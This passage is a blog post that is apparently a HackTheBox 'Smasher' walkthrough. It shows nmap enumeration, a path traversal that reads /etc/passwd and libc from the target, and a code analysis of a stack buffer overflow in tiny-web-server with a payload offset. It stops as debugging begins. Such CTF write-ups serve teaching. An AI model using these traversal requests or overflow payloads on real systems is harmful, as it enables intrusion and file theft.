@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smasher HTB 50pts - bcp | spiperac&#x27;s blog</title>
+    
+    
+    <link rel="stylesheet" href="https://spiperac.dev/style.css">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://spiperac.dev/favicon.ico">
+    <link rel="apple-touch-icon" href="https://spiperac.dev/favicon.ico" />
+    
+    
+</head>
+<body>
+    <nav id="top" class="navigation">
+    <ul class="nav-links">
+        <li><a href="https://spiperac.dev">Home</a></li>
+        <li><a href="https://spiperac.dev/projects">Projects</a></li>
+        <li><a href="https://spiperac.dev/about">About</a></li>
+    </ul>
+    <div class="nav-avatar">
+        <img src="https://spiperac.dev/images/avatar.png" alt="avatar" class="avatar">
+    </div>
+</nav>
+
+    
+    <div class="content">
+        <div id="content">
+            
+    <article>
+        <header>
+            <h1>Smasher HTB 50pts - bcp</h1>
+            <div class="blog-post-date">
+                Published: 2018-11-22
+                
+            </div>
+        </header>
+        
+        
+            <div id="table-of-contents">
+                <h2>Table of Contents</h2>
+                <ul>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/smasher50pts/#vm-enumeration">VM Enumeration</a>
+                            
+                        </li>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/smasher50pts/#path-traversal-vulnerability">Path Traversal Vulnerability</a>
+                            
+                                <ul>
+                                    
+                                        <li>
+                                            <a href="https://spiperac.dev/posts/smasher50pts/#libc-inspection">Libc inspection</a>
+                                        </li>
+                                    
+                                </ul>
+                            
+                        </li>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/smasher50pts/#buffer-overflow">Buffer Overflow</a>
+                            
+                        </li>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/smasher50pts/#exploitation">Exploitation</a>
+                            
+                                <ul>
+                                    
+                                        <li>
+                                            <a href="https://spiperac.dev/posts/smasher50pts/#test-poc">Test POC</a>
+                                        </li>
+                                    
+                                </ul>
+                            
+                        </li>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/smasher50pts/#futher-exploitation-plan">Futher exploitation plan</a>
+                            
+                        </li>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/smasher50pts/#conclusion">Conclusion</a>
+                            
+                        </li>
+                    
+                </ul>
+            </div>
+        
+        
+        <div class="blog-content">
+            <p>A friend of mine suggested me this box as a good "inspiration" for a
+task for our upcomming CTF at <a href="http://balccon.org">BalCCon</a> congress. I
+was immediately hooked by the idea of setting a web challenge as an
+entry gate for a binary exploitation challenge. That twist gives it a
+little bit of 'real world' feeling ( not really), and a better path
+for libc 'leaking', unlike ususal 'here you go, download libc from
+here' way.</p>
+<h1 id="vm-enumeration">VM Enumeration</h1>
+<p>Quick scan with nmap revealed following:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">[badarg:~/ctf/hackthebox/box/Smasher]$</span><span> nmap</span><span style="color:#bf616a;"> -sC -sV</span><span> 10.10.10.89
+</span><span style="color:#bf616a;">Starting</span><span> Nmap 7.70 ( https://nmap.org ) </span><span style="color:#bf616a;">at</span><span> 2018-10-01 10:28 CEST
+</span><span style="color:#bf616a;">Nmap</span><span> scan report for 10.10.10.89
+</span><span style="color:#bf616a;">Host</span><span> is up (0.039s latency)</span><span style="color:#96b5b4;">.
+</span><span style="color:#bf616a;">Not</span><span> shown: 998 closed ports
+</span><span style="color:#bf616a;">PORT</span><span>     STATE SERVICE         VERSION
+</span><span style="color:#bf616a;">22/tcp</span><span>   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; </span><span style="color:#bf616a;">protocol</span><span> 2.0)
+</span><span>| </span><span style="color:#bf616a;">ssh-hostkey:
+</span><span>|   </span><span style="color:#bf616a;">2048</span><span> a6:23:c5:7b:f1:1f:df:68:25:dd:3a:2b:c5:74:00:46 (RSA)
+</span><span>|   </span><span style="color:#bf616a;">256</span><span> 57:81:a5:46:11:33:27:53:2b:99:29:9a:a8:f3:8e:de (ECDSA)
+</span><span>|</span><span style="color:#bf616a;">_</span><span>  256 c5:23:c1:7a:96:d6:5b:c0:c4:a5:f8:37:2e:5d:ce:a0 (ED25519)
+</span><span style="color:#bf616a;">1111/tcp</span><span> open  lmsocialserver?
+</span><span>| </span><span style="color:#bf616a;">fingerprint-strings:
+</span><span>|   </span><span style="color:#bf616a;">FourOhFourRequest,</span><span> GenericLines, SIPOptions:
+</span><span>|     </span><span style="color:#bf616a;">HTTP/1.1</span><span> 404 Not found
+</span><span>|     </span><span style="color:#bf616a;">Server:</span><span> shenfeng tiny-web-server
+</span><span>|     </span><span style="color:#bf616a;">Content-length:</span><span> 14
+</span><span>|     </span><span style="color:#bf616a;">File</span><span> not found
+</span><span>|   </span><span style="color:#bf616a;">GetRequest,</span><span> HTTPOptions, RTSPRequest:
+</span><span>|     </span><span style="color:#bf616a;">HTTP/1.1</span><span> 200 OK
+</span><span>|     </span><span style="color:#bf616a;">Server:</span><span> shenfeng tiny-web-server
+</span><span>|     </span><span style="color:#bf616a;">Content-Type:</span><span> text/html
+</span><span>|     &lt;html&gt;&lt;head&gt;&lt;style&gt;body{font-family: monospace; font-size: 13px;}td </span><span style="color:#bf616a;">{padding:</span><span> 1.5px 6px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;
+</span><span>|     &lt;tr&gt;&lt;td&gt;&lt;a </span><span style="color:#bf616a;">href</span><span>=&quot;</span><span style="color:#a3be8c;">index.html</span><span>&quot;&gt;index.html&lt;/a&gt;&lt;/td&gt;&lt;td&gt;</span><span style="color:#d08770;">2018</span><span style="color:#bf616a;">-03-31</span><span> 00:</span><span style="color:#d08770;">57</span><span>&lt;/td&gt;&lt;td&gt;</span><span style="color:#d08770;">2</span><span>.1K&lt;/td&gt;&lt;/tr&gt;
+</span><span>|</span><span style="color:#bf616a;">_    </span><span>&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;
+</span><span style="color:#bf616a;">1</span><span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span><span style="color:#bf616a;">...
+</span><span>
+</span><span style="color:#bf616a;">Service</span><span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span style="color:#bf616a;">Nmap</span><span> done: 1 IP address (1 host up) </span><span style="color:#bf616a;">scanned</span><span> in 124.22 seconds
+</span></code></pre>
+<p>There are SSH and HTTP servers running on this box. HTTP server
+name(lmsocialserver?)(Server: shenfeng tiny-web-server) doesn't look
+familiar. Let's see what it does, and check headers.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">[badarg:~/ctf/hackthebox/box/Smasher]$</span><span> curl</span><span style="color:#bf616a;"> -v</span><span> http://10.10.10.89:1111/
+</span><span style="color:#bf616a;">*</span><span> Trying 10.10.10.89...
+</span><span style="color:#bf616a;">*</span><span> TCP_NODELAY set
+</span><span style="color:#bf616a;">*</span><span> Connected to 10.10.10.89 (10.10.10.89) </span><span style="color:#bf616a;">port</span><span> 1111 (#0)
+</span><span>&gt; GET </span><span style="color:#bf616a;">/</span><span> HTTP/1.1
+</span><span>&gt; Host: </span><span style="color:#bf616a;">10.10.10.89:1111
+</span><span>&gt; User-Agent: </span><span style="color:#bf616a;">curl/7.54.0
+</span><span>&gt; Accept: </span><span style="color:#bf616a;">*/*
+</span><span>&gt;
+</span><span>&lt; HTTP/1.1 </span><span style="color:#bf616a;">200</span><span> OK
+</span><span>&lt; Server: </span><span style="color:#bf616a;">shenfeng</span><span> tiny-web-server
+</span><span>&lt; Content-Type: </span><span style="color:#bf616a;">text/html
+</span><span style="color:#bf616a;">*</span><span> no chunk, no close, no size. Assume close to signal end
+</span><span>&lt;
+</span><span>&lt;html&gt;&lt;head&gt;&lt;style&gt;body{font-family: monospace; font-size: 13px;}td </span><span style="color:#bf616a;">{padding:</span><span> 1.5px 6px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;
+</span><span>&lt;tr&gt;&lt;td&gt;&lt;a </span><span style="color:#bf616a;">href</span><span>=&quot;</span><span style="color:#a3be8c;">index.html</span><span>&quot;&gt;index.html&lt;/a&gt;&lt;/td&gt;&lt;td&gt;</span><span style="color:#d08770;">2018</span><span style="color:#bf616a;">-03-31</span><span> 00:</span><span style="color:#d08770;">57</span><span>&lt;/td&gt;&lt;td&gt;</span><span style="color:#d08770;">2</span><span>.1K&lt;/td&gt;&lt;/tr&gt;
+</span><span style="color:#bf616a;">*</span><span> Closing connection 0
+</span><span>&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;%
+</span><span>
+</span></code></pre>
+<p>Looks like the web server returns a file listing, which shows that
+there's only one file available in that dir, and it's index.html.</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>
+</span><span>&lt;</span><span style="color:#bf616a;">form </span><span style="color:#d08770;">method</span><span>=&quot;</span><span style="color:#a3be8c;">post</span><span>&quot; </span><span style="color:#d08770;">action</span><span>=&quot;</span><span style="color:#a3be8c;">index.php</span><span>&quot;&gt;
+</span><span>&lt;</span><span style="color:#bf616a;">div </span><span style="color:#d08770;">class</span><span>=&quot;</span><span style="color:#a3be8c;">box</span><span>&quot;&gt;
+</span><span>&lt;</span><span style="color:#bf616a;">h1</span><span>&gt;Dashboard&lt;/</span><span style="color:#bf616a;">h1</span><span>&gt;
+</span><span>&lt;</span><span style="color:#bf616a;">input </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">email</span><span>&quot; </span><span style="color:#d08770;">name</span><span>=&quot;</span><span style="color:#a3be8c;">email</span><span>&quot; </span><span style="color:#d08770;">value</span><span>=&quot;</span><span style="color:#a3be8c;">email</span><span>&quot; </span><span style="color:#d08770;">onFocus</span><span>=&quot;</span><span style="color:#a3be8c;">field_focus(this, &#39;email&#39;);</span><span>&quot; </span><span style="color:#d08770;">onblur</span><span>=&quot;</span><span style="color:#bf616a;">field_blur</span><span>(</span><span style="color:#bf616a;">this</span><span>, &#39;</span><span style="color:#a3be8c;">email</span><span>&#39;);&quot; </span><span style="color:#d08770;">class</span><span>=&quot;</span><span style="color:#a3be8c;">email</span><span>&quot; /&gt;
+</span><span>
+</span><span>&lt;</span><span style="color:#bf616a;">input </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">password</span><span>&quot; </span><span style="color:#d08770;">name</span><span>=&quot;</span><span style="color:#a3be8c;">email</span><span>&quot; </span><span style="color:#d08770;">value</span><span>=&quot;</span><span style="color:#a3be8c;">email</span><span>&quot; </span><span style="color:#d08770;">onFocus</span><span>=&quot;</span><span style="color:#a3be8c;">field_focus(this, &#39;email&#39;);</span><span>&quot; </span><span style="color:#d08770;">onblur</span><span>=&quot;</span><span style="color:#bf616a;">field_blur</span><span>(</span><span style="color:#bf616a;">this</span><span>, &#39;</span><span style="color:#a3be8c;">email</span><span>&#39;);&quot; </span><span style="color:#d08770;">class</span><span>=&quot;</span><span style="color:#a3be8c;">email</span><span>&quot; /&gt;
+</span><span>
+</span><span>&lt;</span><span style="color:#bf616a;">center</span><span>&gt;&lt;</span><span style="color:#bf616a;">a </span><span style="color:#d08770;">href</span><span>=&quot;</span><span style="color:#a3be8c;">#</span><span>&quot;&gt;&lt;</span><span style="color:#bf616a;">div </span><span style="color:#d08770;">class</span><span>=&quot;</span><span style="color:#a3be8c;">btn</span><span>&quot;&gt;Login&lt;/</span><span style="color:#bf616a;">div</span><span>&gt;&lt;/</span><span style="color:#bf616a;">a</span><span>&gt;&lt;/</span><span style="color:#bf616a;">center</span><span>&gt;</span><span style="color:#65737e;">&lt;!-- End Btn --&gt;
+</span><span>
+</span><span>&lt;/</span><span style="color:#bf616a;">div</span><span>&gt; </span><span style="color:#65737e;">&lt;!-- End Box --&gt;
+</span><span>
+</span><span>&lt;/</span><span style="color:#bf616a;">form</span><span>&gt;
+</span><span>
+</span><span>&lt;</span><span style="color:#bf616a;">p</span><span>&gt;For security reasons this server will be restarted every 60 seconds!!!&lt;/</span><span style="color:#bf616a;">p</span><span>&gt;
+</span><span>
+</span><span>&lt;</span><span style="color:#bf616a;">script </span><span style="color:#d08770;">src</span><span>=&quot;</span><span style="color:#a3be8c;">//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js</span><span>&quot; </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">text/javascript</span><span>&quot;&gt;&lt;/</span><span style="color:#bf616a;">script</span><span>&gt;
+</span></code></pre>
+<p>Looks like a dead end with a fake login form. Form action posts data to
+index.php, which doesn't exist on server. So, we have to look somewhere
+else.</p>
+<p>Few minutes of checking around with gobuster gave me interesting insight
+by hitting points like //..////../etc/, i found this interesting</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">[badarg:~/ctf/hackthebox/box/Smasher]$</span><span> curl http://10.10.10.89:1111//etc/passwd
+</span><span style="color:#bf616a;">root:x:0:0:root:/root:/bin/bash
+</span><span style="color:#bf616a;">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span><span style="color:#bf616a;">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span><span style="color:#bf616a;">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span><span style="color:#bf616a;">sync:x:4:65534:sync:/bin:/bin/sync
+</span><span style="color:#bf616a;">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span><span style="color:#bf616a;">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span><span style="color:#bf616a;">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span><span style="color:#bf616a;">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span><span style="color:#bf616a;">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span><span style="color:#bf616a;">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span><span style="color:#bf616a;">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span><span style="color:#bf616a;">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span><span style="color:#bf616a;">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span><span style="color:#bf616a;">list:x:38:38:Mailing</span><span> List Manager:/var/list:/usr/sbin/nologin
+</span><span style="color:#bf616a;">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span><span style="color:#bf616a;">gnats:x:41:41:Gnats</span><span> Bug-Reporting System (admin)</span><span style="color:#bf616a;">:/var/lib/gnats:/usr/sbin/nologin
+</span><span style="color:#bf616a;">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span><span style="color:#bf616a;">systemd-timesync:x:100:102:systemd</span><span> Time Synchronization,,,:/run/systemd:/bin/false
+</span><span style="color:#bf616a;">systemd-network:x:101:103:systemd</span><span> Network Management,,,:/run/systemd/netif:/bin/false
+</span><span style="color:#bf616a;">systemd-resolve:x:102:104:systemd</span><span> Resolver,,,:/run/systemd/resolve:/bin/false
+</span><span style="color:#bf616a;">systemd-bus-proxy:x:103:105:systemd</span><span> Bus Proxy,,,:/run/systemd:/bin/false
+</span><span style="color:#bf616a;">syslog:x:104:108::/home/syslog:/bin/false
+</span><span style="color:#bf616a;">_apt:x:105:65534::/nonexistent:/bin/false
+</span><span style="color:#bf616a;">messagebus:x:106:110::/var/run/dbus:/bin/false
+</span><span style="color:#bf616a;">uuidd:x:107:111::/run/uuidd:/bin/false
+</span><span style="color:#bf616a;">sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span style="color:#bf616a;">www:x:1000:1000:www,,,:/home/www:/bin/bash
+</span><span style="color:#bf616a;">smasher:x:1001:1001:,,,:/home/smasher:/bin/bash
+</span></code></pre>
+<h1 id="path-traversal-vulnerability">Path Traversal Vulnerability</h1>
+<p>This is Path Traversal vulnerability in servers code. Nice, but what can
+we do with it? I'll cut all my failed searches and ideas, in the end i
+found actual http server code and binary (Yaaay!)</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">[badarg:~/ctf/hackthebox/box/Smasher]$</span><span> curl http://10.10.10.89:1111//home/www/tiny-web-server/ | </span><span style="color:#bf616a;">sed -e </span><span>&#39;</span><span style="color:#a3be8c;">s/&lt;[^&gt;]*&gt;//g</span><span>&#39;
+</span><span style="color:#bf616a;">.git/2018-03-31</span><span> 00:57</span><span style="color:#b48ead;">[</span><span>DIR</span><span style="color:#b48ead;">]
+</span><span style="color:#bf616a;">public_html/2018-03-31</span><span> 00:57</span><span style="color:#b48ead;">[</span><span>DIR</span><span style="color:#b48ead;">]
+</span><span style="color:#bf616a;">tiny.c2018-03-31</span><span> 00:5713.2K
+</span><span style="color:#bf616a;">README.md2018-03-31</span><span> 00:571.0K
+</span><span style="color:#bf616a;">tiny2018-03-31</span><span> 00:5744.4K
+</span><span style="color:#bf616a;">Makefile2018-03-31</span><span> 00:57175
+</span></code></pre>
+<p>Downloaded all of them. Great thing is that we have actual source code,
+which will speed up the whole process. Next i wanted to see, because i
+knew what my target was, is ASLR on the server enabled, and what can i
+do about it?</p>
+<p>First, i've checked version of the system:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">[badarg:~/ctf/hackthebox/box/Smasher]$</span><span> curl http://10.10.10.89:1111//etc/issue
+</span><span style="color:#bf616a;">Ubuntu</span><span> 16.04.4 LTS </span><span style="color:#96b5b4;">\n \l
+</span></code></pre>
+<p>After that i tried to read /proc/sys/kernel/randomize~vaspace~, and for
+some reason ( permissions) i couldn't read that file. So i assumed the
+worst, and tried to get libc.so.6 so i can use it later.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">wget</span><span> http://10.10.10.89:1111//lib/x86_64-linux-gnu/libc.so.6
+</span></code></pre>
+<h2 id="libc-inspection">Libc inspection</h2>
+<p>So, now, what i usually like to do is, identify version of libc, in this
+case i've had access to /etc/issue so i already know, i procceded
+futher to get docker container with radare2, ropper, pwndbg and
+libc-database, and few other tools, up and running on Ubuntu 16.04 x64.
+Let's start analysing tiny file, which is the binary for web server.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work$</span><span> file tiny
+</span><span style="color:#bf616a;">tiny:</span><span> ELF 64-bit LSB executable, x86-64, version 1 (SYSV)</span><span style="color:#bf616a;">,</span><span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID</span><span style="color:#b48ead;">[</span><span>sha1</span><span style="color:#b48ead;">]</span><span>=b872377623aa9e081bc7d72c8dbe882f03bf66b7, not stripped
+</span><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work$</span><span> ldd tiny
+</span><span style="color:#bf616a;">linux-vdso.so.1</span><span> =&gt;  (0x00007ffc7b9a4000)
+</span><span style="color:#bf616a;">libc.so.6</span><span> =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f846ddf0000)
+</span><span style="color:#bf616a;">/lib64/ld-linux-x86-64.so.2</span><span> (0x00007f846e1ba000)
+</span></code></pre>
+<p>Not stripped, huray.</p>
+<p>I've checked strings, as usual, but didn't saw nothing specialy
+useful. Except maybe this one:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">GNU</span><span> C99 5.4.0 20160609</span><span style="color:#bf616a;"> -mtune</span><span>=generic</span><span style="color:#bf616a;"> -march</span><span>=x86-64</span><span style="color:#bf616a;"> -g -O2 -std</span><span>=c99</span><span style="color:#bf616a;"> -fno-stack-protector
+</span></code></pre>
+<p>NX is disabled, if you are to belive this one -fno-stack-protector, so i
+checked.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> gdb</span><span style="color:#bf616a;"> -q</span><span> tiny
+</span><span style="color:#bf616a;">Reading</span><span> symbols from tiny...done.
+</span><span style="color:#bf616a;">pwndbg</span><span>&gt; checksec
+</span><span style="color:#bf616a;">[*] </span><span>&#39;</span><span style="color:#a3be8c;">/ctf/work/tiny</span><span>&#39;
+</span><span>    </span><span style="color:#bf616a;">Arch:</span><span>     amd64-64-little
+</span><span>    </span><span style="color:#bf616a;">RELRO:</span><span>    Partial RELRO
+</span><span>    </span><span style="color:#bf616a;">Stack:</span><span>    No canary found
+</span><span>    </span><span style="color:#bf616a;">NX:</span><span>       NX disabled
+</span><span>    </span><span style="color:#bf616a;">PIE:</span><span>      No PIE (0x400000)
+</span><span>    </span><span style="color:#bf616a;">RWX:</span><span>      Has RWX segments
+</span><span>    </span><span style="color:#bf616a;">FORTIFY:</span><span>  Enabled
+</span><span>
+</span><span style="color:#bf616a;">pwndbg</span><span>&gt; 
+</span></code></pre>
+<p>Yup, looks like only ASLR is enabled.</p>
+<h1 id="buffer-overflow">Buffer Overflow</h1>
+<p>So let's take a step back, and check on tiny.c source code. If we take
+a look at our first vuln on this box, which was directory traversal, you
+can locate line responsive for it in function parse~request~()</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span>
+</span><span style="color:#b48ead;">char</span><span>* filename = uri;
+</span><span style="color:#b48ead;">if</span><span>(uri[</span><span style="color:#d08770;">0</span><span>] == &#39;</span><span style="color:#a3be8c;">/</span><span>&#39;){
+</span><span>    filename = uri + </span><span style="color:#d08770;">1</span><span>;
+</span><span>    </span><span style="color:#b48ead;">int</span><span> length = </span><span style="color:#96b5b4;">strlen</span><span>(filename);
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(length == </span><span style="color:#d08770;">0</span><span>){
+</span><span>        filename = &quot;</span><span style="color:#a3be8c;">.</span><span>&quot;;
+</span><span>    } </span><span style="color:#b48ead;">else </span><span>{
+</span><span>        </span><span style="color:#b48ead;">for </span><span>(</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#d08770;">0</span><span>; i &lt; length; ++ i) {
+</span><span>            </span><span style="color:#b48ead;">if </span><span>(filename[i] == &#39;</span><span style="color:#a3be8c;">?</span><span>&#39;) {
+</span><span>                filename[i] = &#39;</span><span style="color:#96b5b4;">\0</span><span>&#39;;
+</span><span>                </span><span style="color:#b48ead;">break</span><span>;
+</span><span>            }
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span><span style="color:#bf616a;">url_decode</span><span>(filename, req-&gt;</span><span style="color:#bf616a;">filename</span><span>, MAXLINE);
+</span></code></pre>
+<p>You can see that uri[0] doesn't have any real check for directory
+lookup</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span>
+</span><span style="color:#b48ead;">if</span><span>(uri[</span><span style="color:#d08770;">0</span><span>] == &#39;</span><span style="color:#a3be8c;">/</span><span>&#39;){
+</span><span>    filename = uri + </span><span style="color:#d08770;">1</span><span>;
+</span><span>    </span><span style="color:#b48ead;">int</span><span> length = </span><span style="color:#96b5b4;">strlen</span><span>(filename);
+</span></code></pre>
+<p>After filename gets sorted here, it is passed to url~decode~(), which is
+a simple little method:</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">url_decode</span><span>(</span><span style="color:#b48ead;">char</span><span>* </span><span style="color:#bf616a;">src</span><span>, </span><span style="color:#b48ead;">char</span><span>* </span><span style="color:#bf616a;">dest</span><span>, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">max</span><span>) {
+</span><span style="color:#b48ead;">char </span><span>*p = src;
+</span><span style="color:#b48ead;">char</span><span> code[</span><span style="color:#d08770;">3</span><span>] = { </span><span style="color:#d08770;">0 </span><span>};
+</span><span style="color:#b48ead;">while</span><span>(*p &amp;&amp; --max) {
+</span><span>    </span><span style="color:#b48ead;">if</span><span>(*p == &#39;</span><span style="color:#a3be8c;">%</span><span>&#39;) {
+</span><span>        </span><span style="color:#96b5b4;">memcpy</span><span>(code, ++p, </span><span style="color:#d08770;">2</span><span>);
+</span><span>        *dest++ = (</span><span style="color:#b48ead;">char</span><span>)</span><span style="color:#96b5b4;">strtoul</span><span>(code, </span><span style="color:#d08770;">NULL</span><span>, </span><span style="color:#d08770;">16</span><span>);
+</span><span>        p += </span><span style="color:#d08770;">2</span><span>;
+</span><span>    } </span><span style="color:#b48ead;">else </span><span>{
+</span><span>        *dest++ = *p++;
+</span><span>    }
+</span><span>}
+</span><span>*dest = &#39;</span><span style="color:#96b5b4;">\0</span><span>&#39;;
+</span><span>}
+</span></code></pre>
+<p>Function does take 3 args a pointer to a source location buffer, a
+destination location buffer, and a max size to read.</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">url_decode</span><span>(</span><span style="color:#b48ead;">char</span><span>* </span><span style="color:#bf616a;">src</span><span>, </span><span style="color:#b48ead;">char</span><span>* </span><span style="color:#bf616a;">dest</span><span>, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">max</span><span>)
+</span></code></pre>
+<p>What's the deal with this? Let's see. This is how function is called
+from process~request~() function:</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span>
+</span><span style="color:#bf616a;">url_decode</span><span>(filename, req-&gt;</span><span style="color:#bf616a;">filename</span><span>, MAXLINE);
+</span></code></pre>
+<p>filename = is a pointer to buffer defined here:</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span>
+</span><span style="color:#b48ead;">char</span><span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE];
+</span></code></pre>
+<p>So filename is a buffer of MAXLINE size, which is:</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span>
+</span><span style="color:#b48ead;">#define </span><span>MAXLINE </span><span style="color:#d08770;">1024   </span><span style="color:#65737e;">/* max length of a line */
+</span></code></pre>
+<p>That's a first argument, and it's a source argument which get's
+copied into second argument. That argument is req-&gt;filename, which is a
+buffer inside struct named http~request~:</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span>
+</span><span style="color:#b48ead;">typedef struct </span><span>{
+</span><span>    </span><span style="color:#b48ead;">char</span><span> filename[</span><span style="color:#d08770;">512</span><span>];
+</span><span>    off_t offset;              </span><span style="color:#65737e;">/* for support Range */
+</span><span>    size_t end;
+</span><span>} http_request;
+</span></code></pre>
+<p>And we can clearly see that buffer filename is 512 bytes long.</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span style="color:#b48ead;">char</span><span> filename[</span><span style="color:#d08770;">512</span><span>];
+</span></code></pre>
+<p>Third argument is number of bytes to copy, which is also set to MAXLINE,
+1024 bytes.</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span style="color:#b48ead;">#define </span><span>MAXLINE </span><span style="color:#d08770;">1024   </span><span style="color:#65737e;">/* max length of a line */
+</span></code></pre>
+<p>So there's our buffer overflow.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>Having most of the stuff needed for futher exploitation, let's dive
+into it. Buffer overflow occures when url~decoder~() tries to 'decode'
+filename sent with a GET request. So our payload will be in:</p>
+<pre data-lang="example" style="background-color:#2b303b;color:#c0c5ce;" class="language-example "><code class="language-example" data-lang="example"><span>GET /payloadpayloadpayload
+</span></code></pre>
+<p>Note: we won't count first slash '/' from GET request in payload
+length, because it get trimed before processing.</p>
+<p><img src="/images/smasher-2018-11-22/2025-01-18_19-09-55_image.png" alt="" /></p>
+<p>from the picture above we can calculate that our buffer is at:</p>
+<pre data-lang="example" style="background-color:#2b303b;color:#c0c5ce;" class="language-example "><code class="language-example" data-lang="example"><span>0x298 - (0x90 - 0x30) = 0x238
+</span><span>Converted to decimal 568
+</span></code></pre>
+<p>We can test that with and overwrite RIP with B's. Our payload is "A"
+* 568 + 0x424242424242</p>
+<p>Let's run tiny binary in gdb and set breakpoint right after
+url~decode~() ret.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> gdb</span><span style="color:#bf616a;"> -q</span><span> tiny
+</span><span style="color:#bf616a;">Reading</span><span> symbols from tiny...done.
